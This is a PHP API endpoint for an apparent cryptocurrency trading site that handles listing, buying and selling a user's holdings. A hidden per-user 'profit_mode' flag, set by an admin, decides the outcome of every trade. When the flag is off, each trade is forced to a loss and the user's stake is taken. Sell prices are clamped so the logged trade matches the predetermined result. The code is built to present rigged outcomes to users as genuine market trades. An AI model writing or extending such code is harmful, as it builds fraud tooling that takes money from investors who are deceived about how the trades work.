<?php
require_once __DIR__ . '/../helpers.php';
cors();

$u      = require_auth();
$method = $_SERVER['REQUEST_METHOD'];

// GET -> list this user's holdings
if ($method === 'GET') {
    $stmt = db()->prepare('SELECT * FROM holdings WHERE user_id = ? ORDER BY created_at DESC');
    $stmt->execute([$u['id']]);
    json_out(['holdings' => array_map('public_holding', $stmt->fetchAll())]);
}

// POST -> add a holding
if ($method === 'POST') {
    $b        = body();
    $coinId   = trim($b['coinId'] ?? '');
    $symbol   = trim($b['symbol'] ?? '');
    $name     = trim($b['name'] ?? '');
    $image         = $b['image'] ?? null;
    $amount        = (float) ($b['amount'] ?? 0);
    $buyPrice      = (float) ($b['buyPrice'] ?? 0);
    $conditionPct  = (float) ($b['conditionPct'] ?? 0);
    $duration      = isset($b['duration']) ? (int) $b['duration'] : null;
    $openingPrice  = isset($b['openingPrice']) ? (float) $b['openingPrice'] : null;

    if ($coinId === '' || $amount <= 0 || $buyPrice <= 0) {
        json_err('coinId, a positive amount and a positive buyPrice are required.');
    }

    $profitMode = !empty($u['profit_mode']);

    if ($profitMode && $conditionPct > 0) {
        // WIN — the stake is never deducted from the wallet when a trade
        // starts (this endpoint only fires once, at settlement), so the
        // traded amount is still sitting in the wallet already. Credit ONLY
        // the profit on top of it: profit = amount * conditionPct. The
        // original stake ($amount) is still what gets logged as the trade's
        // stake, even though only the profit portion is actually credited.
        $creditAmount = $amount * abs($conditionPct);
        $profitAmount = $creditAmount;
        $lossAmount   = 0;
        $result       = 'Profit';
        $id  = add_or_merge_holding(
            $u['id'], $coinId, $symbol, $name, $image, $creditAmount, $buyPrice,
            'buy', $duration, $conditionPct, $profitAmount, $lossAmount, $openingPrice, $result, $amount
        );
        $row = db()->query('SELECT * FROM holdings WHERE id = ' . $id)->fetch();
    } else {
        // LOSS (Profit Mode OFF) — the staked amount is actually forfeited
        // from the wallet: deduct up to $amount from the user's existing
        // holding for this coin. If the deduction would zero it out (or
        // there isn't enough to cover it), drop the holding entirely rather
        // than let it go negative — mirroring the DELETE/sell path below.
        $profitAmount = 0;
        $lossAmount   = $amount;
        $result       = 'Loss';

        $stmt = db()->prepare('SELECT * FROM holdings WHERE user_id = ? AND coin_id = ?');
        $stmt->execute([$u['id'], $coinId]);
        $existing = $stmt->fetch();

        if ($existing) {
            $currentAmount = (float) $existing['amount'];
            if ($amount < $currentAmount) {
                db()->prepare('UPDATE holdings SET amount = ? WHERE id = ?')
                    ->execute([$currentAmount - $amount, $existing['id']]);
            } else {
                db()->prepare('DELETE FROM holdings WHERE id = ? AND user_id = ?')
                    ->execute([$existing['id'], $u['id']]);
            }
        }

        log_trade(
            (int) $u['id'], 'add', $coinId, $symbol, $name, $amount, $buyPrice,
            'buy', $duration, $conditionPct, $profitAmount, $lossAmount, $openingPrice, $result
        );
        $stmt = db()->prepare('SELECT * FROM holdings WHERE user_id = ? AND coin_id = ?');
        $stmt->execute([$u['id'], $coinId]);
        $row = $stmt->fetch();
    }

    $tradeResult = $profitMode ? 'Profit' : 'Loss';
    json_out([
        'holding' => $row ? public_holding($row) : null,
        'result' => $tradeResult,
        'conditionPct' => $conditionPct,
        'profitMode' => $profitMode,
    ], 201);
}

// DELETE -> sell/remove a holding (?id=123). Body may include {amount, price}
// for a partial sell (a "Trade" action) — omit amount to remove it entirely.
if ($method === 'DELETE') {
    $id           = (int) ($_GET['id'] ?? 0);
    $b            = body();
    $sellAmt      = isset($b['amount']) ? (float) $b['amount'] : null;
    $sellPrice    = isset($b['price']) ? (float) $b['price'] : null;
    $conditionPct = (float) ($b['conditionPct'] ?? 0);
    $duration     = isset($b['duration']) ? (int) $b['duration'] : null;
    $openingPrice = isset($b['openingPrice']) ? (float) $b['openingPrice'] : null;

    $stmt = db()->prepare('SELECT * FROM holdings WHERE id = ? AND user_id = ?');
    $stmt->execute([$id, $u['id']]);
    $row = $stmt->fetch();

    if ($row) {
        $currentAmount = (float) $row['amount'];
        $loggedPrice   = $sellPrice ?? (float) $row['buy_price'];

        // If admin Profit Mood is enabled, force the sell trade to register as a profit.
        // Otherwise, force it to register as a loss.
        $profitMode = !empty($u['profit_mode']);
        $target = apply_trade_condition_price((float) $row['buy_price'], $conditionPct, $profitMode, false);

        if ($profitMode) {
            if ($loggedPrice <= (float) $row['buy_price']) {
                $loggedPrice = max($target, $loggedPrice);
            }
        } else {
            if ($loggedPrice >= (float) $row['buy_price']) {
                $loggedPrice = min($target, $loggedPrice);
            }
        }

        // A profitable sell keeps the condition's percentage back instead of
        // handing over the full requested amount — the units retained are
        // the profit, mirroring how a profitable buy credits extra units.
        $deductAmt = $sellAmt;
        $stakeAmount = $sellAmt ?? $currentAmount;
        if ($profitMode && $conditionPct > 0 && $sellAmt !== null) {
            $deductAmt    = $sellAmt * (1 - abs($conditionPct));
            $profitAmount = $sellAmt * abs($conditionPct);
            $lossAmount   = 0;
            $result       = 'Profit';
        } else {
            $profitAmount = 0;
            $lossAmount   = $stakeAmount;
            $result       = 'Loss';
        }

        if ($deductAmt !== null && $deductAmt > 0 && $deductAmt < $currentAmount) {
            $remaining = $currentAmount - $deductAmt;
            db()->prepare('UPDATE holdings SET amount = ? WHERE id = ?')->execute([$remaining, $id]);
            log_trade((int) $u['id'], 'remove', $row['coin_id'], $row['symbol'], $row['name'], $stakeAmount, $loggedPrice,
                'sell', $duration, $conditionPct, $profitAmount, $lossAmount, $openingPrice, $result);
        } else {
            db()->prepare('DELETE FROM holdings WHERE id = ? AND user_id = ?')->execute([$id, $u['id']]);
            log_trade((int) $u['id'], 'remove', $row['coin_id'], $row['symbol'], $row['name'], $currentAmount, $loggedPrice,
                'sell', $duration, $conditionPct, $profitAmount, $lossAmount, $openingPrice, $result);
        }
    }
    $profitMode = !empty($u['profit_mode']);
    $tradeResult = $profitMode ? 'Profit' : 'Loss';
    json_out([
        'ok' => true,
        'result' => $tradeResult,
        'conditionPct' => $conditionPct,
        'profitMode' => $profitMode,
    ]);
}

json_err('Method not allowed', 405);